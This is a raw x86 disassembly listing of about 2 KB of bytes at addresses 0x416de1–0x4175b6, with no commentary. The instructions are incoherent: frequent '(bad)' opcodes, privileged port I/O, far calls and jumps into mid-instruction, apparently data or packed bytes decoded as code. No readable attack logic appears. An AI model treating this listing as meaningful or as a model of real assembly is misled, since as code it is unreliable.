  416de1:	ficomp WORD PTR [ebx-0x51]
  416de4:	pop    ebp
  416de5:	cmc    
  416de6:	punpckhwd mm7,mm7
  416de9:	push   ecx
  416dea:	mov    edx,0x6978e05a
  416def:	jo     0x416d87
  416df1:	fcmovne st,st(5)
  416df3:	call   0x99d8:0xfbdbaddd
  416dfa:	cmp    eax,DWORD PTR [ebx+0x9]
  416dfd:	xor    eax,0x9222a0be
  416e02:	sbb    al,0xa9
  416e04:	xchg   esi,eax
  416e05:	and    eax,0xca09dbc5
  416e0a:	sbb    cl,BYTE PTR [edx]
  416e0c:	pop    esp
  416e0d:	adc    DWORD PTR [edi+0x7f],ebx
  416e10:	out    0xa0,al
  416e12:	outs   dx,DWORD PTR ds:[esi]
  416e13:	out    dx,al
  416e14:	mov    al,0x54
  416e16:	shl    ebp,1
  416e18:	dec    edx
  416e19:	jns    0x416dbf
  416e1b:	mov    bp,0xf627
  416e1f:	sbb    al,0x84
  416e21:	pop    esi
  416e22:	and    edi,DWORD PTR [ecx+esi*1+0x3c]
  416e26:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416e28:	sbb    edi,ebp
  416e2a:	jnp    0x416e87
  416e2c:	jl     0x416e4e
  416e2e:	or     BYTE PTR [ecx+edx*4],0xa3
  416e32:	add    DWORD PTR [ebx],ebx
  416e34:	out    0xe0,eax
  416e36:	or     edi,0xffffffa2
  416e39:	test   DWORD PTR [ebx-0x57],edx
  416e3c:	jae    0x416de7
  416e3e:	adc    al,ch
  416e40:	(bad)  [eax]
  416e42:	jmp    0x416e94
  416e44:	mov    bh,0xbd
  416e46:	int3   
  416e47:	imul   esp,DWORD PTR [eax+0x28],0xffffffe2
  416e4b:	and    ebx,ecx
  416e4d:	inc    esp
  416e4e:	ftst   
  416e50:	sbb    eax,0x932feb5a
  416e55:	xor    DWORD PTR [ecx+edx*8-0x1b],eax
  416e59:	sar    BYTE PTR [ecx-0x4e],1
  416e5c:	dec    eax
  416e5d:	push   esi
  416e5e:	inc    ebx
  416e5f:	dec    ebp
  416e60:	stos   BYTE PTR es:[edi],al
  416e61:	mov    WORD PTR [eax],fs
  416e63:	lods   eax,DWORD PTR ds:[esi]
  416e64:	dec    edx
  416e65:	pushf  
  416e66:	or     al,0xf2
  416e68:	out    dx,eax
  416e69:	pop    ecx
  416e6a:	cmp    DWORD PTR [ebx-0x70],eax
  416e6d:	rcr    DWORD PTR [ebx],cl
  416e6f:	popf   
  416e70:	fs dec ebx
  416e72:	ins    DWORD PTR es:[edi],dx
  416e73:	loopne 0x416e9c
  416e75:	(bad)  
  416e76:	imul   BYTE PTR [ecx+ebp*8]
  416e79:	clc    
  416e7a:	hlt    
  416e7b:	mov    edi,0x3fbf3c09
  416e80:	cwde   
  416e81:	aad    0x20
  416e83:	outs   dx,BYTE PTR ds:[esi]
  416e84:	fwait
  416e85:	lods   eax,DWORD PTR ds:[esi]
  416e86:	adc    ecx,ebx
  416e88:	inc    edx
  416e89:	xchg   ecx,eax
  416e8a:	cmp    eax,0x2eab95d6
  416e8f:	pop    esi
  416e90:	out    0xd6,al
  416e92:	ret    
  416e93:	dec    ecx
  416e94:	xor    eax,0x4790d92c
  416e99:	cmc    
  416e9a:	sbb    BYTE PTR [ecx+0x6c],0xfb
  416e9e:	sbb    DWORD PTR [ebp+0x2d],0xffffffc1
  416ea2:	(bad)  
  416ea3:	repz cmp BYTE PTR [edx+0x327213a],dh
  416eaa:	shl    DWORD PTR [edi+eiz*1-0x5639149b],0x6a
  416eb2:	or     al,0x14
  416eb4:	daa    
  416eb5:	imul   eax,DWORD PTR [ecx+ebx*2+0x13f0bfb2],0xabc68206
  416ec0:	xchg   esi,eax
  416ec1:	hlt    
  416ec2:	pop    edi
  416ec3:	pusha  
  416ec4:	jne    0x416f13
  416ec6:	add    BYTE PTR [edx-0x5a213b4e],dl
  416ecc:	fisubr DWORD PTR [ecx-0x3a423a71]
  416ed2:	inc    edi
  416ed3:	jmp    0x416e80
  416ed5:	and    eax,0xc45f8957
  416eda:	mov    ah,dl
  416edc:	add    bh,BYTE PTR [esi-0x7b186c0a]
  416ee2:	pop    esi
  416ee3:	out    0x32,al
  416ee5:	sbb    BYTE PTR [ecx],dh
  416ee7:	mov    WORD PTR [edi],es
  416ee9:	retf   0x9c0f
  416eec:	pop    esi
  416eed:	aam    0xc7
  416eef:	sbb    ah,0xc4
  416ef2:	mov    al,ds:0xba075989
  416ef7:	add    eax,0x960b1c61
  416efc:	or     eax,0xf295c7e6
  416f01:	leave  
  416f02:	stos   BYTE PTR es:[edi],al
  416f03:	mov    ch,0x5c
  416f05:	xchg   esp,eax
  416f06:	jle    0x416f41
  416f08:	push   edx
  416f09:	sub    ebx,DWORD PTR [edi+0x6bf787bc]
  416f0f:	mov    ds:0xe6fe9c58,al
  416f14:	aam    0x2d
  416f16:	sub    ch,BYTE PTR [edi-0x4a32145e]
  416f1c:	and    eax,0x690e6f5e
  416f21:	fnsave [ebx+eax*4]
  416f24:	sub    bh,BYTE PTR [eax]
  416f26:	shr    edi,1
  416f28:	mov    cs,WORD PTR [eax+0x2e]
  416f2b:	pop    esp
  416f2c:	icebp  
  416f2d:	jle    0x416fa4
  416f2f:	or     eax,0x49a113cf
  416f34:	pop    ebx
  416f35:	imul   eax,edx,0xffffffa7
  416f38:	mov    esi,0x1c07ea2c
  416f3d:	jl     0x416ee8
  416f3f:	dec    DWORD PTR [ebx+eiz*2+0x61]
  416f43:	push   ebx
  416f44:	popf   
  416f45:	mov    ss:0xc4f441db,eax
  416f4b:	loop   0x416eda
  416f4d:	sbb    bl,BYTE PTR [eax+0x34]
  416f50:	xchg   ebx,eax
  416f51:	or     bl,BYTE PTR [edx-0x40]
  416f54:	push   edx
  416f55:	aas    
  416f56:	adc    al,BYTE PTR [ebx-0x62ce5d9]
  416f5c:	lock inc esi
  416f5e:	mov    esp,0xc8782bd7
  416f63:	mul    DWORD PTR [edi+0x6669346]
  416f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6a:	dec    DWORD PTR [esi-0x25f9c682]
  416f70:	push   0xffffff87
  416f72:	dec    ebp
  416f73:	aas    
  416f74:	gs mov ah,0xa7
  416f77:	inc    ecx
  416f78:	pop    es
  416f79:	sti    
  416f7a:	(bad)  
  416f7b:	sub    BYTE PTR [ecx],ah
  416f7d:	add    esp,DWORD PTR [edi]
  416f7f:	test   eax,0x78873921
  416f84:	loopne 0x416f22
  416f86:	xor    DWORD PTR [edx+0x43a01263],esi
  416f8c:	sub    al,0xd2
  416f8e:	mov    ecx,DWORD PTR [ecx-0x493260f2]
  416f94:	aaa    
  416f95:	int3   
  416f96:	ret    
  416f97:	cwde   
  416f98:	lock fcom st(0)
  416f9b:	mov    si,0x99d6
  416f9f:	dec    ecx
  416fa0:	or     al,BYTE PTR [esi+edi*8-0x4b]
  416fa4:	iret   
  416fa5:	rcl    BYTE PTR [ebx-0x66],1
  416fa8:	das    
  416fa9:	mov    bl,0xe3
  416fab:	mov    ebx,0x7240b1ba
  416fb0:	lock push edi
  416fb2:	das    
  416fb3:	stc    
  416fb4:	or     eax,0x1f29d734
  416fb9:	sbb    BYTE PTR [esi-0xf3af2df],ah
  416fbf:	push   ds
  416fc0:	add    bl,dh
  416fc2:	outs   dx,BYTE PTR ds:[esi]
  416fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc4:	pop    ecx
  416fc5:	dec    ebx
  416fc6:	xor    DWORD PTR [edx-0x16377db5],ebx
  416fcc:	retf   0xe7f0
  416fcf:	jge    0x41704e
  416fd1:	in     al,0x28
  416fd3:	ss jg  0x416fa3
  416fd6:	cdq    
  416fd7:	add    dl,BYTE PTR [ebp-0x309c03e5]
  416fdd:	out    dx,al
  416fde:	cmp    dh,BYTE PTR [edi]
  416fe0:	aad    0x6a
  416fe2:	jl     0x417034
  416fe4:	into   
  416fe5:	dec    eax
  416fe6:	(bad)  
  416fe7:	outs   dx,BYTE PTR ds:[esi]
  416fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe9:	rol    BYTE PTR [esi+ebx*4-0x5b],1
  416fed:	mov    ecx,0xfebb1514
  416ff2:	not    eax
  416ff4:	in     al,0x16
  416ff6:	inc    ebx
  416ff7:	loopne 0x41706c
  416ff9:	stos   DWORD PTR es:[edi],eax
  416ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ffb:	or     ah,BYTE PTR [edx+0x1e05555]
  417001:	cdq    
  417002:	aam    0x5d
  417004:	ins    BYTE PTR es:[edi],dx
  417005:	je     0x417080
  417007:	int3   
  417008:	icebp  
  417009:	retf   
  41700a:	or     DWORD PTR [eax],edi
  41700c:	out    dx,eax
  41700d:	dec    ecx
  41700e:	pop    ss
  41700f:	jns    0x417054
  417011:	retf   0x8169
  417014:	cs iret 
  417016:	in     eax,dx
  417017:	leave  
  417018:	fwait
  417019:	jl     0x416fe3
  41701b:	adc    DWORD PTR [ebx-0x400ca485],edi
  417021:	in     al,0x27
  417023:	call   esp
  417025:	pop    es
  417026:	push   edi
  417027:	(bad)  
  417029:	dec    esp
  41702a:	les    esp,FWORD PTR [ecx]
  41702c:	mov    ?,WORD PTR [eax-0x1d1835b7]
  417032:	push   ebp
  417033:	in     eax,dx
  417034:	add    dl,BYTE PTR [edx+ebx*1+0x4c462e29]
  41703b:	addr16 popf 
  41703d:	mov    ah,0xc2
  41703f:	sbb    esp,edi
  417041:	pop    es
  417042:	mov    edi,0xf86a8301
  417047:	xor    ecx,DWORD PTR [eax-0x25]
  41704a:	or     esi,DWORD PTR [esi+edi*2+0x1fde72bf]
  417051:	mov    ds:0xefa04103,eax
  417056:	std    
  417057:	xor    al,BYTE PTR [ebx-0x48]
  41705a:	ret    
  41705b:	in     eax,dx
  41705c:	es arpl bp,dx
  41705f:	clc    
  417060:	out    dx,eax
  417061:	sbb    eax,0x42d7c1e
  417066:	stc    
  417067:	pop    edx
  417068:	xchg   esp,eax
  417069:	fdivr  st(1),st
  41706b:	add    cl,BYTE PTR ds:0xc8ee20bd
  417071:	adc    dl,ah
  417073:	add    DWORD PTR [edx+0x64],eax
  417076:	xor    al,0xcc
  417078:	imul   ebp,DWORD PTR [ecx+edx*1],0x2c498a94
  41707f:	jb     0x4170d7
  417081:	pop    ecx
  417082:	ja     0x41706c
  417084:	test   al,0x89
  417086:	imul   edi,ecx,0x8cc09cb1
  41708c:	enter  0x556e,0x95
  417090:	in     eax,dx
  417091:	ficomp DWORD PTR [ecx-0x4fb4f1c2]
  417097:	out    dx,al
  417098:	sub    bl,ch
  41709a:	mov    ds:0x789f6264,al
  41709f:	mov    eax,0x1174b963
  4170a4:	jo     0x417039
  4170a6:	mov    bh,0xf6
  4170a8:	sti    
  4170a9:	ds push eax
  4170ab:	and    eax,0xb08f5bd2
  4170b0:	aaa    
  4170b1:	in     eax,dx
  4170b2:	mul    BYTE PTR [esi]
  4170b4:	xor    BYTE PTR [esi-0x56],0x1a
  4170b8:	hlt    
  4170b9:	pop    es
  4170ba:	in     eax,0x4e
  4170bc:	jnp    0x417102
  4170be:	lea    ebx,[ebx]
  4170c0:	lods   eax,DWORD PTR ds:[esi]
  4170c1:	loopne 0x417075
  4170c3:	mov    eax,0xe37241c2
  4170c8:	and    ecx,edx
  4170ca:	scas   al,BYTE PTR es:[edi]
  4170cb:	hlt    
  4170cc:	imul   ecx,esp,0x15
  4170cf:	sbb    dh,al
  4170d1:	int3   
  4170d2:	mov    ecx,0x19d5ef2a
  4170d7:	les    eax,FWORD PTR [ebp+0xa]
  4170da:	adc    DWORD PTR ds:0xa92b9ebb,ebx
  4170e0:	mov    bh,0x4a
  4170e2:	out    dx,al
  4170e3:	sti    
  4170e4:	in     al,0x58
  4170e6:	mov    cl,BYTE PTR [ebx-0x3e6660f9]
  4170ec:	fild   WORD PTR [ebx]
  4170ee:	dec    ebx
  4170ef:	xchg   esi,eax
  4170f0:	mov    al,ds:0xa0c55a89
  4170f5:	repnz dec esp
  4170f7:	adc    DWORD PTR [eax+ecx*1],0xa4dafc16
  4170fe:	jmp    0x74fdc131
  417103:	and    al,0xce
  417105:	jge    0x41709e
  417107:	push   cs
  417108:	add    ch,bl
  41710a:	loope  0x417103
  41710c:	push   ecx
  41710d:	mov    BYTE PTR [ebx],0x20
  417110:	cwde   
  417111:	(bad)  
  417112:	out    0x7b,al
  417114:	cs push ss
  417116:	cmp    DWORD PTR [esp+ecx*4],ecx
  417119:	and    BYTE PTR [edi],dh
  41711b:	mov    eax,0x6ae51eb4
  417120:	add    al,0xb1
  417122:	adc    al,0xf2
  417124:	inc    edi
  417125:	jg     0x417115
  417127:	rol    BYTE PTR [edi+0x3d],1
  41712a:	popa   
  41712b:	rcr    BYTE PTR [ebx-0x71fa6ab5],0xbb
  417132:	pop    ecx
  417133:	sub    al,0xee
  417135:	dec    ebx
  417136:	xchg   ebp,eax
  417137:	call   0x1ed3:0x9f404649
  41713e:	mov    edx,0x10ea64c
  417143:	imul   edi,DWORD PTR ds:0x63192ded,0xffffffa1
  41714a:	retf   0x88ad
  41714d:	mov    WORD PTR [esi+0x72],?
  417150:	mov    esi,cs
  417152:	cld    
  417153:	pusha  
  417154:	mov    ebx,0x2ffc8ec4
  417159:	jl     0x41710b
  41715b:	(bad)  [edx-0x2]
  41715e:	data16 (bad) 
  417160:	scas   al,BYTE PTR es:[edi]
  417161:	add    BYTE PTR [ecx-0xb44909b],dh
  417167:	or     DWORD PTR [edx-0x3966615f],edi
  41716d:	clc    
  41716e:	dec    ebx
  41716f:	sub    al,0x82
  417171:	xchg   edx,eax
  417172:	ret    
  417173:	(bad)  
  417174:	sbb    ecx,DWORD PTR [edi+0x441e3b0e]
  41717a:	sub    al,0xb0
  41717c:	sub    eax,0x44366b2c
  417181:	js     0x417130
  417183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417184:	ins    BYTE PTR es:[edi],dx
  417185:	push   ebx
  417186:	out    0x7f,al
  417188:	xchg   DWORD PTR [edx],edx
  41718a:	push   es
  41718b:	sub    DWORD PTR [edi+0x637047d9],esp
  417191:	mov    fs,WORD PTR [edi]
  417193:	add    ecx,DWORD PTR [edx-0x66f32415]
  417199:	adc    al,BYTE PTR [ebx-0x1e345f8]
  41719f:	stos   BYTE PTR es:[edi],al
  4171a0:	cmp    dl,BYTE PTR [eax+ecx*1+0x2e]
  4171a4:	xlat   BYTE PTR ds:[ebx]
  4171a5:	out    0x44,al
  4171a7:	mov    ebx,0x9e946508
  4171ac:	dec    edx
  4171ad:	(bad)  
  4171ae:	out    0x1b,eax
  4171b0:	not    BYTE PTR [edi]
  4171b2:	cmp    BYTE PTR [edx],bh
  4171b4:	and    dh,bh
  4171b6:	pop    ecx
  4171b7:	or     al,0xd5
  4171b9:	aam    0xab
  4171bb:	add    al,BYTE PTR [edi]
  4171bd:	outs   dx,BYTE PTR ds:[esi]
  4171be:	cmp    dh,BYTE PTR [esi+ebx*2]
  4171c1:	(bad)  
  4171c2:	push   edx
  4171c3:	sub    eax,0x1331a5b1
  4171c8:	adc    DWORD PTR ss:[ebp+0x401f99f2],edi
  4171cf:	mov    ecx,0x52811109
  4171d4:	dec    edx
  4171d5:	in     al,0x4e
  4171d7:	mov    ebp,DWORD PTR [edx+0x4b]
  4171da:	push   ds
  4171db:	in     eax,dx
  4171dc:	push   esp
  4171dd:	sub    eax,0x76728e1a
  4171e2:	je     0x417240
  4171e4:	stos   DWORD PTR es:[edi],eax
  4171e5:	jle    0x4171c8
  4171e7:	jne    0x41721b
  4171e9:	cwde   
  4171ea:	cmp    eax,DWORD PTR [edi]
  4171ec:	pop    es
  4171ed:	ret    
  4171ee:	and    bh,BYTE PTR [esi-0x21cfa66d]
  4171f4:	sub    eax,0x634452e
  4171f9:	pop    ebp
  4171fa:	daa    
  4171fb:	or     eax,eax
  4171fd:	pop    edi
  4171fe:	repz mov fs,edi
  417201:	adc    ch,BYTE PTR [ecx]
  417203:	pop    es
  417204:	test   eax,0x6b3551e2
  417209:	dec    ebx
  41720a:	dec    ebx
  41720b:	movd   mm4,DWORD PTR [esi-0x674f1d29]
  417212:	test   DWORD PTR ds:0x577d600c,ebx
  417218:	cmp    BYTE PTR [ebx],ah
  41721a:	stos   BYTE PTR es:[edi],al
  41721b:	cmp    al,dh
  41721d:	hlt    
  41721e:	outs   dx,BYTE PTR ds:[esi]
  41721f:	mov    cl,0x64
  417221:	in     al,dx
  417222:	sub    edx,edi
  417224:	xor    al,0xcc
  417226:	add    eax,0xdb17cf80
  41722b:	jne    0x417212
  41722d:	lgs    ecx,FWORD PTR [ebx]
  417230:	icebp  
  417231:	xchg   DWORD PTR [edx+0x22915e29],esp
  417237:	test   al,0xfb
  417239:	push   ebp
  41723a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41723b:	in     eax,dx
  41723c:	bound  eax,QWORD PTR [edi+0x4a]
  41723f:	mov    WORD PTR [edx],ds
  417241:	lods   eax,DWORD PTR ds:[esi]
  417242:	lea    esi,[ebp-0x397da73a]
  417248:	pop    edx
  417249:	adc    DWORD PTR [edx+0x6f],edi
  41724c:	out    0xd1,eax
  41724e:	repnz into 
  417250:	mov    BYTE PTR [ecx+0xb2c0501],bh
  417256:	jae    0x41722e
  417258:	cmc    
  417259:	ins    BYTE PTR es:[edi],dx
  41725a:	clc    
  41725b:	clc    
  41725c:	dec    edx
  41725d:	adc    DWORD PTR [edi],esi
  41725f:	mov    ah,0xa1
  417261:	popf   
  417262:	retf   
  417263:	daa    
  417264:	(bad)  
  417265:	retf   0x6d0c
  417268:	push   ss
  417269:	fcmovne st,st(4)
  41726b:	xchg   edx,eax
  41726c:	jge    0x4172ca
  41726e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41726f:	loope  0x417276
  417271:	inc    esp
  417272:	daa    
  417273:	(bad)
  417276:	xor    bh,bh
  417278:	retf   
  417279:	jmp    0x3b25:0x7c697bba
  417280:	scas   al,BYTE PTR es:[edi]
  417281:	fbstp  TBYTE PTR [ebx+0xdfc26d7]
  417287:	into   
  417288:	xchg   ecx,eax
  417289:	xor    BYTE PTR [ebx+0x26ebba75],dh
  41728f:	sbb    eax,0xeb8ca5fc
  417294:	jbe    0x417300
  417296:	sbb    eax,DWORD PTR [esp+ebx*2]
  417299:	jmp    0x2e8c51a
  41729e:	mov    DWORD PTR [eax-0x43],ebx
  4172a1:	sar    ah,cl
  4172a3:	push   edi
  4172a4:	ret    0x59c2
  4172a7:	mov    dh,0x76
  4172a9:	mov    dl,0xa7
  4172ab:	fmul   DWORD PTR [ecx-0x40]
  4172ae:	aas    
  4172af:	xor    ecx,DWORD PTR ds:0xae423240
  4172b5:	(bad)  
  4172b6:	cwde   
  4172b7:	sub    esi,DWORD PTR [esi-0x78661109]
  4172bd:	push   ss
  4172be:	push   es
  4172bf:	cmp    eax,0x45b6ad45
  4172c4:	sti    
  4172c5:	(bad)  
  4172c6:	(bad)  
  4172c7:	sub    BYTE PTR [edi],al
  4172c9:	add    DWORD PTR [eax],0xffffff90
  4172cc:	mov    ecx,0x464eae91
  4172d1:	jecxz  0x417256
  4172d3:	in     eax,0x3e
  4172d5:	stos   DWORD PTR es:[edi],eax
  4172d6:	cld    
  4172d7:	pop    ds
  4172d8:	mov    ecx,0xfd5b93b7
  4172dd:	xor    ecx,DWORD PTR [edi]
  4172df:	(bad)  
  4172e0:	cdq    
  4172e1:	sub    eax,0xb8a91e02
  4172e6:	jbe    0x41733f
  4172e8:	sub    al,0x2e
  4172ea:	test   al,0x38
  4172ec:	in     eax,0xcb
  4172ee:	cmp    dh,BYTE PTR [ebx+0x18c83544]
  4172f4:	stos   BYTE PTR es:[edi],al
  4172f5:	int    0x49
  4172f7:	sahf   
  4172f8:	lock sbb BYTE PTR ds:0x462c8c94,ch
  4172ff:	pop    eax
  417300:	jg     0x41737c
  417302:	popf   
  417303:	jecxz  0x4172c1
  417305:	ds popf 
  417307:	out    dx,eax
  417308:	inc    ebx
  417309:	xor    DWORD PTR [ebx-0x19],ecx
  41730c:	add    eax,edi
  41730e:	nop
  41730f:	bound  esp,QWORD PTR [ecx-0x23]
  417312:	dec    edi
  417313:	retf   
  417314:	das    
  417315:	jg     0x41729c
  417317:	in     eax,dx
  417318:	jae    0x4172b4
  41731a:	scas   al,BYTE PTR es:[edi]
  41731b:	sub    eax,0x613c991b
  417320:	test   DWORD PTR [ebx],esp
  417322:	bound  edi,QWORD PTR [ebp-0x56a9116c]
  417328:	jns    0x4172ba
  41732a:	fs (bad) 
  41732c:	jge    0x417343
  41732e:	fwait
  41732f:	js     0x4172c6
  417331:	into   
  417332:	dec    ebp
  417333:	dec    edi
  417334:	call   0xf2f8:0xdd6a4560
  41733b:	(bad)  
  41733c:	adc    eax,0x31b82a84
  417341:	pop    ss
  417342:	imul   edi,DWORD PTR [esp+eax*4],0x1e
  417346:	ja     0x4172e3
  417348:	cmp    esp,ecx
  41734a:	adc    eax,0x7cb84ec6
  41734f:	fbstp  TBYTE PTR [edi+0x4e]
  417352:	cmp    al,0x2
  417354:	xchg   ecx,eax
  417355:	xchg   esi,eax
  417356:	cmp    dh,dh
  417358:	lahf   
  417359:	cmc    
  41735a:	data16 loope 0x4173a0
  41735d:	test   al,0x28
  41735f:	xchg   edx,eax
  417360:	jnp    0x4173ad
  417362:	and    eax,0x6c370842
  417367:	or     al,BYTE PTR [ebp+0x294270ae]
  41736d:	jecxz  0x417356
  41736f:	or     DWORD PTR [ebp-0x24],edx
  417372:	and    edi,edi
  417374:	pop    eax
  417375:	in     al,0xa5
  417377:	push   edx
  417378:	mov    dh,0x41
  41737a:	shl    DWORD PTR [eax+0x46],0x70
  41737e:	sub    BYTE PTR ds:0x61544376,dh
  417384:	cld    
  417385:	repz push edx
  417387:	fisttp DWORD PTR [eax]
  417389:	mov    ?,WORD PTR [edi-0x1f1f6d30]
  41738f:	enter  0x63f7,0xe7
  417393:	dec    edx
  417394:	jg     0x41739e
  417396:	pushf  
  417397:	cmc    
  417398:	fwait
  417399:	adc    BYTE PTR ds:0x1c79290d,cl
  41739f:	jnp    0x41738a
  4173a1:	mov    al,0xaa
  4173a3:	push   ebp
  4173a4:	cmp    al,0xa2
  4173a6:	lea    esi,[esi+0x35be2d33]
  4173ac:	stc    
  4173ad:	xor    bl,BYTE PTR [ebx-0x60]
  4173b0:	dec    esp
  4173b1:	call   0x386b096e
  4173b6:	int3   
  4173b7:	dec    edx
  4173b8:	cmp    BYTE PTR [eax-0x3aceedc0],0xef
  4173bf:	je     0x4173ad
  4173c1:	dec    esi
  4173c2:	jp     0x417428
  4173c4:	pop    ss
  4173c5:	xor    ebp,DWORD PTR [ecx-0x3d34d6f4]
  4173cb:	dec    ebp
  4173cc:	iret   
  4173cd:	mov    dh,0x7e
  4173cf:	scas   eax,DWORD PTR es:[edi]
  4173d0:	cmp    eax,0x50ed19f9
  4173d5:	sbb    al,0x4c
  4173d7:	inc    ebx
  4173d8:	fistp  QWORD PTR [ecx+esi*2]
  4173db:	or     BYTE PTR [ebx],dl
  4173dd:	xchg   DWORD PTR [esi],esi
  4173df:	inc    edx
  4173e0:	mov    ebx,0x662560ea
  4173e5:	adc    eax,0xeb06d9d7
  4173ea:	hlt    
  4173eb:	pop    es
  4173ec:	shr    DWORD PTR [ecx],1
  4173ee:	fsubp  st(5),st
  4173f0:	dec    esp
  4173f1:	aas    
  4173f2:	jns    0x417449
  4173f4:	adc    esp,DWORD PTR [ebx+0x5a]
  4173f7:	adc    ebp,DWORD PTR [edx-0x1c]
  4173fa:	mov    ebx,0xc9f2ef09
  4173ff:	and    al,0xb2
  417401:	stc    
  417402:	mov    ebp,0xec3ea147
  417407:	sbb    al,0xd2
  417409:	inc    edx
  41740a:	push   edx
  41740b:	popf   
  41740c:	icebp  
  41740d:	mov    cl,0xe7
  41740f:	cmp    ch,BYTE PTR [esi+eiz*1-0x3ab9cef1]
  417416:	sbb    al,0xf2
  417418:	int    0xa9
  41741a:	dec    edi
  41741b:	pop    edi
  41741c:	in     eax,dx
  41741d:	out    0x10,al
  41741f:	dec    ebx
  417420:	and    al,0x64
  417422:	and    al,0xd1
  417424:	mov    ebx,0x93303ab1
  417429:	jno    0x4173c4
  41742b:	and    BYTE PTR [edi+0xa94a500],al
  417431:	jae    0x417471
  417433:	sub    al,0xc1
  417435:	mov    edx,0xea564777
  41743a:	(bad)  
  41743b:	sub    edi,DWORD PTR [eax+0x3c]
  41743e:	arpl   WORD PTR [ecx-0x4c],di
  417441:	hlt    
  417442:	push   0xdfc4d2ad
  417447:	add    eax,edi
  417449:	jnp    0x4174b6
  41744b:	push   ebp
  41744c:	and    DWORD PTR [edi],ebx
  41744e:	mov    ss,WORD PTR [ebx+0x3abfc2a0]
  417454:	or     eax,0x3eb08534
  417459:	and    BYTE PTR [esi-0x1969482a],dl
  41745f:	and    al,BYTE PTR [ebx]
  417461:	and    esp,DWORD PTR [esi]
  417463:	dec    eax
  417464:	add    DWORD PTR [ebp-0x772b020d],esp
  41746a:	mov    ds:0x19c82247,eax
  41746f:	call   0x4c5e:0x8c5efc22
  417476:	jae    0x4174ca
  417478:	mov    bh,0xdb
  41747a:	cmp    al,0xe
  41747c:	xor    DWORD PTR [edx],ebx
  41747e:	dec    sp
  417480:	ss push cs
  417482:	sti    
  417483:	leave  
  417484:	in     eax,0x2d
  417486:	mov    eax,ss:0xc112977e
  41748c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41748d:	jp     0x41747b
  41748f:	xlat   BYTE PTR ds:[ebx]
  417490:	jno    0x41745c
  417492:	mov    BYTE PTR [ebp+0x17],cl
  417495:	adc    BYTE PTR [edx+0x27],0x6f
  417499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41749a:	mov    ds:0x14ecb17,al
  41749f:	inc    ebx
  4174a0:	cmp    eax,0xa20cd3b6
  4174a5:	jl     0x4174ca
  4174a7:	in     eax,dx
  4174a8:	push   ebx
  4174a9:	push   ds
  4174aa:	in     eax,0x6e
  4174ac:	push   edx
  4174ad:	push   cs
  4174ae:	mov    dh,0x9c
  4174b0:	dec    eax
  4174b1:	and    DWORD PTR [esi],ebx
  4174b3:	mov    eax,0x60dd1208
  4174b8:	push   ebp
  4174b9:	xchg   ecx,eax
  4174ba:	addr16 aaa 
  4174bc:	in     eax,0xb3
  4174be:	mov    eax,fs
  4174c0:	adc    DWORD PTR [edi-0x3a],eax
  4174c3:	mov    ds:0x19f97b60,al
  4174c8:	out    dx,al
  4174c9:	jg     0x417516
  4174cb:	or     DWORD PTR [eax],esp
  4174cd:	xchg   esp,eax
  4174ce:	fist   WORD PTR [esp+eax*2]
  4174d1:	enter  0xff41,0x8e
  4174d5:	add    DWORD PTR [edi],ecx
  4174d7:	or     DWORD PTR [ebx+0x48eb9c17],eax
  4174dd:	rol    BYTE PTR [ebx],1
  4174df:	fdivr  st,st(4)
  4174e1:	mov    edi,0xf8ae36c4
  4174e6:	stos   BYTE PTR es:[edi],al
  4174e7:	xchg   DWORD PTR [esi-0x141d348f],esi
  4174ed:	aad    0xd6
  4174ef:	lahf   
  4174f0:	or     esp,DWORD PTR [esi-0xdfbe97b]
  4174f6:	mov    ds:0x1600046e,eax
  4174fb:	sbb    cl,0x94
  4174fe:	into   
  4174ff:	jecxz  0x41752a
  417501:	leave  
  417502:	enter  0xc38c,0x79
  417506:	repz cs push ss
  417509:	sub    eax,0xbd3440e3
  41750e:	jnp    0x4174d9
  417510:	xor    eax,0x800f4eb8
  417515:	aad    0xfe
  417517:	fdiv   DWORD PTR [eax+0x1c]
  41751a:	sbb    al,0xd2
  41751c:	cwde   
  41751d:	test   al,0xd
  41751f:	scas   al,BYTE PTR es:[edi]
  417520:	aas    
  417521:	mov    esp,0xbecd4132
  417526:	pop    ebp
  417527:	iret   
  417528:	mov    al,ds:0x56d8fb2e
  41752d:	adc    eax,0x972a7fb9
  417532:	jo     0x417509
  417534:	mov    bl,0x1c
  417536:	jg     0x417546
  417538:	inc    ecx
  417539:	inc    edi
  41753a:	aas    
  41753b:	push   cs
  41753c:	int    0x7c
  41753e:	mov    dh,0x25
  417540:	lahf   
  417541:	fild   WORD PTR [esi-0x69fd1636]
  417547:	in     eax,0x26
  417549:	add    al,0x93
  41754b:	lods   eax,DWORD PTR ds:[esi]
  41754c:	into   
  41754d:	bnd je 0x41754d
  417550:	mov    WORD PTR ds:0x10fbbbf6,?
  417556:	jle    0x417599
  417558:	cli    
  417559:	cs cmp eax,0xb4a02db7
  41755f:	adc    ah,BYTE PTR [eax]
  417561:	pop    eax
  417562:	add    eax,0x2cd95f3a
  417567:	fistp  QWORD PTR [edx+esi*4+0x1b]
  41756b:	fimul  WORD PTR fs:0x7815d0c5
  417572:	into   
  417573:	int    0x90
  417575:	pop    esp
  417576:	sbb    bl,BYTE PTR [ecx]
  417578:	xchg   ecx,eax
  417579:	(bad)  [esi+0x16]
  41757c:	sub    al,0x5d
  41757e:	cwde   
  41757f:	das    
  417580:	jnp    0x417558
  417582:	pusha  
  417583:	mov    al,0xb2
  417585:	retf   0xe18
  417588:	push   ds
  417589:	sub    DWORD PTR [edx-0x22006ad4],ebp
  41758f:	retf   
  417590:	jmp    0xfd616f00
  417595:	jno    0x417606
  417597:	xchg   ebp,eax
  417598:	fdivr  st,st(0)
  41759a:	pop    eax
  41759b:	add    eax,0xa4e1b7a0
  4175a0:	mov    al,ds:0xd2634461
  4175a5:	imul   edi,DWORD PTR [edx+0x72],0x38c88e98
  4175ac:	or     BYTE PTR [ebx-0x5c],bl
  4175af:	cmp    edx,DWORD PTR [esi+eax*4+0x6c415233]
  4175b6:	sub    eax,0x88013388
